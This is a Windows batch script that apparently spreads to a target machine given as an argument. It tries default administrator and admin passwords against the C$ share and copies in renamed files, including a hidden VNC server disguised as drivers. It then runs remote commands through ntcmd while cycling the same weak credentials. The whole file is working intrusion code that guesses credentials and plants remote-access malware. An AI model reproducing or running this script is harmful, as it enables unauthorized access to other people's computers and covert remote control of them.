@echo off
net use \\%1\C$ "" "/user:administrator"
net use \\%1\C$ "administrator" "/user:administrator"
net use \\%1\C$ "admin" "/user:administrator"
net use \\%1\C$ "" "/user:admin"
net use \\%1\C$ "admin" "/user:admin"
net use \\%1\C$ "administrator" "/user:admin"
md \\%1\C$\Temp
md \\%1\C$\Temp\Drivers
copy /Y vnsystask.exe \\%1\C$\Temp\Drivers
copy /Y VNCHooks.dll \\%1\C$\Temp\Drivers
copy /Y omnithread_rt.dll \\%1\C$\Temp\Drivers
copy /Y nchk2.bat \\%1\C$\Temp\Drivers\go.bat
copy /Y bl.vxd \\%1\C$\Temp\Drivers\bl.exe
ntcmd \\%1 -u:administrator -p: < a.vxd
ntcmd \\%1 -u:administrator -p:administrator < a.vxd
ntcmd \\%1 -u:administrator -p:admin < a.vxd
ntcmd \\%1 -u:admin -p: < a.vxd
ntcmd \\%1 -u:admin -p:admin < a.vxd
ntcmd \\%1 -u:admin -p:administrator < a.vxd
net use \\%1\C$ /del